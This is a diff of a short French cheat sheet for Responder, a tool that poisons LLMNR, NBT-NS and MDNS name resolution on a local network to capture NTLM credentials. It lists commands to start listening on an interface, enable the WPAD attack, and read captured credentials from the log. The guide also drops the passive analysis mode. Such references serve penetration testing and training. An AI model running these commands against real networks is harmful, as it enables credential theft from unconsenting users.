@@ -1,24 +1,35 @@
-# Responder - Résumé et utilisation
+# Responder
 
-## Présentation
-Responder est un outil utilisé pour intercepter les requêtes réseau Windows (LLMNR, NBT-NS, MDNS) 
-et capturer des identifiants NTLM pour les exploiter.
+## 📌 Présentation
+Responder est un outil permettant d'exploiter les protocoles de résolution de noms sur un réseau local (LLMNR, NBT-NS, MDNS) pour capturer des identifiants NTLMv1/v2.
 
-## Installation
-# Kali Linux : préinstallé
+## 🛠️ Installation
+Sur Kali Linux, Responder est préinstallé. Pour vérifier :
+```bash
+responder -h
+```
+Si ce n'est pas le cas :
+```bash
 sudo apt update && sudo apt install responder -y
+```
 
-## Utilisation de base
-# Lancer Responder sur une interface (ex: eth0)
+## 🚀 Utilisation de base
+
+### 📡 1. Écouter le réseau sur une interface
+```bash
+sudo responder -I <interface>
+```
+Exemple :
+```bash
 sudo responder -I eth0
+```
 
-# Mode analyse (observe sans interagir)
-sudo responder -I eth0 -A
-
-# Mode capture avec empoisonnement DNS activé
+### 🔥 2. Activer l'attaque avec WPAD
+```bash
 sudo responder -I eth0 -w On
+```
 
-## Vérification des logs
-ls /usr/share/responder/logs/
+### 📜 3. Vérifier les logs des identifiants capturés
+```bash
 cat /usr/share/responder/logs/Responder-Session.log
-
+```
